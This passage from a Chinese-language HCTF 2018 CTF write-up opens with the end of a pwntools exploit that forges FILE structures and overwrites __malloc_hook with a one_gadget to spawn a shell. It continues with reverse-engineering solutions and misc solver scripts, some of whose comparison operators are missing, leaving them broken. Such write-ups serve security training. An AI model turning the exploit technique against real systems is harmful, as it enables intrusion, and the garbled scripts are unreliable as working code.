        payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)
        p.sendline(payload)
        malloc_hook_addr = libc.symbols['__malloc_hook']
        payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884)
        payload += p64(bss_address + 0x200) * 6
        payload += p64(malloc_hook_addr) + p64(malloc_hook_addr + 0x8 + 4) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)
        payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)
        p.sendline(payload)
        p.sendline(p64(libc.address + 0x10a38c)) # one_gadget
        payload = 'a' * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884)
        payload += p64(bss_address + 0x200) * 7
        payload += p64(bss_address + 0x200) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)
        payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)
        p.sendline(payload)
        sleep(0.5)
        p.sendline('%49$p')
        p.interactive()
        p.close()
    if __name__ == '__main__':
        pwn()
flag:`hctf{72717218d270a992e1415bb825366e79d254ec232022b5fc45297ef7ae5c7ea6}`
## re
### LuckStar
这题有不少反调试.  
首先在TlsCallback_0里获取了一堆反调试常用函数地址:  
排查几款调试器，并解混淆的main函数  
在之前获取的CheckRemoteDebuggerPresent函数下断点  
发现在调用main之前被调用，用于重设srand的种子,应为hctf。  
接着进入main函数：  
main函数里，my_base64函数被混淆，只用用seed=hctf才能正确还原。  
my_base64如下：  
在my_base64里面对输入的字符进行变异的base64处理，不过把大小写互换，然后把加密的结果做一段xor处理。return后与main函数里预存储的v17做比较，相同则得到flag。  
由于仅作xor处理，这里我动调时把预存储的v17数据放在xor处理执行，得到base64(flag),  
做大小写转换后，解base64得flag:  
### Seven
驱动程序逆向，程序关键逻辑很少，需要我们走一个类似7字的迷宫，迷宫图直接就能看到，四个十六进制码0x11,0x1F,0x1E,0x20分别控制人物的上下左右移动，o代表当前位置，*代表不可行位置，.代表可行位置。整个程序找不到输入，但是能发现一个12字节的结构体，查阅资料发现是KEYBOARD_INPUT_DATA结构，第二个USHORT成员MAKECODE是键盘的扫描码，搜索扫描码，得到四个十六进制码分别对应wsad。  
flag:`hctf{ddddddddddddddssaasasasasasasasasas}`
### PolishDuck
Badusb的题目，同种类型的题目出现了很多次，印象里最先看到是在pwnhub-血月归来一题，后来是HITB-hex一题，到SUCTF2018的SecretGarden，XCTF2018Final，然后是HCTF2018的PolishDuck，做法和pwnhub上面的一模一样，都是打开notepad.exe，然后输入一串计算数字。我们只要整理出数字串，计算出结果，hex再hex解码即可得到flag。  
flag:`hctf{P0l1sh_Duck_Tast3s_D3l1ci0us_D0_U_Th1nk?}`
## misc
### freq game
这个题题目大概就是把4个字符的ascii码作为参数进行正弦变换然后加起来的结果，看完代码发现最后乘的rge并没有卵用所以可以消掉，就变成了y/7 =
sin() + sin() + sin() + sin()的样子，所以我找了y/7 >
3的y作为约束条件，因为此时对应的四个sin()值必须都要大于y/7-3。本来是想把这个作为约束条件缩小范围再爆破的，结果用这个条件基本上就能把答案约束出来了，中间好像只有一组数是需要进一步爆破的，但剩的也不多所以很容易就获得了结果。代码如下：
    from pwn import *
    import numpy as np
    def show(mylist,testlist):
        for i in range(len(testlist)):
            if mylist[testlist[i][0]]  3.0:
            testlist.append((i,float(ressplit[i])/7.0))
    print testlist
    mylist = []
    for i in range(256):
        temp = []
        x = np.linspace(0,1,1500)
        y = np.sin(2*np.pi*x*i)
        mylist.append(list(y))
        if show(list(y),testlist) :
            print i
    '''
    temp = [88,89,128,129,130,169,170]
    print testlist[2][1]
    for a in temp:
        for b in temp:
            for c in temp:
                for d in temp:
                    if mylist[a][testlist[2][0]] + mylist[b][testlist[2][0]] + mylist[c][testlist[2][0]] + mylist[d][testlist[2][0]] = testlist[2][1]:
                        print a,b,c,d
    '''
    p.interactive()
因为懒得把代码复制粘贴8遍，所以我是得到每轮结果以后把它保存下来，重开一个直接发过去的，所以最后脚本里只保留了最后一轮的过程，前面的都简化成了发结果。。。
### Guess My Key
这题听说是机器学习一开始没敢做，后来想想好像没那么难，题目思路是96bit的msg和96bit的key，可以任意提交msg和key来得到加密结果，或者提交msg获得用预设的key加密的结果，然后去猜题目预设的key。这个题我的思路是把raw_cipher当作一个空间向量，对每一bit的key去计算它是0和1时与key所获得的raw_cipher之间的距离来分析这1bit为0或1的概率，不断拟合使我计算所得的key与预设的key得到的空间向量不断接近，从而获得预设的key，代码如下：
    from urllib import *
    import json
    url = 'http://150.109.62.46:13577/enc?'
    orilist = []
    orilist.append([0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1])#0.00299699357119
    orilist.append([0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1])#0.00170157012619
    orilist.append([0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1])#0.00135932497845
    orilist.append([0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1])#0.000528410497059
    msg = '1,'*95+'1'
    f = urlopen(url + 'msg=' + msg)
    mylist = json.loads(f.read())
    oricipher = mylist['raw_cipher'].split(',')
    def list2str(mylist):
        result = ''
        for i in mylist:
            if i == 1:
                result += '1,'
            else:
                result += '0,'
        return result[:-1]
    def getdst(tempcipher,oricipher):
        result = 0.0
        for i in range(len(oricipher)):
            result += abs(pow(float(oricipher[i])-float(tempcipher[i]),2))
        return result
    myresult1 = []
    myresult2 = []
    for i in range(96):
        sumzerodst = 0.0
        sumonedst = 0.0
        mindst = 1.0
        minchr = -1
        for j in range(len(orilist)):
            key = orilist[j][:i] + [0] + orilist[j][i+1:]
            f = urlopen(url + 'msg=' + msg + '&' + 'key=' + list2str(key))
            mylist = json.loads(f.read())
            tempcipher = mylist['raw_cipher'].split(',')
            dst = getdst(tempcipher,oricipher)
            if dst  sumzerodst :
            myresult2.append(0)
        else :
            myresult2.append(1)
    print "======myresult======"
    print myresult1